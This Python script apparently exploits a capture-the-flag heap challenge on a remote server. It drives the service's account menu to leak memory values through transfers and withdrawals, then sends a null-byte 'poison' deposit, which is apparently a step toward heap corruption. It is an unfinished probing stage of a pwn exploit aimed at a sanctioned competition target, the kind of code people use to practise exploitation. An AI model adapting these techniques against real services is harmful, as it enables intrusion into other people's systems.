import sys, time, socket, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

P64 = lambda b: struct.unpack("<Q", b[:8])[0]
s = socket.create_connection(("chal.sunshinectf.games", 26004), timeout=10)
buf = b""


def rd(secs=0.35):
    global buf
    s.settimeout(secs)
    try:
        while True:
            d = s.recv(8192)
            if not d:
                return "EOF"
            buf += d
    except socket.timeout:
        return None
    except OSError as e:
        return f"ERR {e}"


def go(tag, payload, wait=0.35):
    global buf
    s.sendall(payload)
    for _ in range(12):
        r = rd(wait)
        if r == "EOF":
            print(f"{tag}: sent {payload!r} -> EOF, tail={buf[-120:]!r}")
            sys.exit(1)
        if b">>>" in buf:
            break
    out, buf = buf, b""
    print(f"{tag}: {out[-160:]!r}")
    return out


rd(1.0); buf = b""


def menu(*lines):
    global buf
    for l in lines:
        s.sendall(str(l).encode() + b"\n")
        for _ in range(10):
            if b">>>" in buf or b"size" in buf or b"name" in buf or b"data" in buf:
                break
            if rd(0.25) == "EOF":
                print("EOF at", l, "tail", repr(buf[-150:])); sys.exit(1)
        out, buf = buf, b""
        print(f"   [{l}] -> {out[-90:]!r}")


print("== open A/C/F")
for n in (b"A", b"C", b"F"):
    s.sendall(b"1\n"); rd(0.3)
    o, buf = buf, b""; print("   menu1 ->", o[-40:])
    s.sendall(n + b"\n"); rd(0.3); o, buf = buf, b""; print("   name ->", o[-40:])
    s.sendall(b"48\n"); rd(0.3); o, buf = buf, b""; print("   size ->", o[-40:])
print("== transfer 0->1"); menu(4, 0, 1)
print("== withdraw 1 (leak X)"); menu(3, 1)
print("   raw:", repr(buf[:70])); buf = b""
print("== transfer 2->1"); menu(4, 2, 1)
print("== withdraw 1 (leak W)"); menu(3, 1)
print("   raw:", repr(buf[:70])); buf = b""
print("== deposit 1 (poison) -> does this die?")
menu(2, 1)
print("   after index prompt:", repr(buf[:80])); buf = b""
s.sendall(b"\0" * 48)
rd(0.5)
print("   after payload:", repr(buf[:120]))
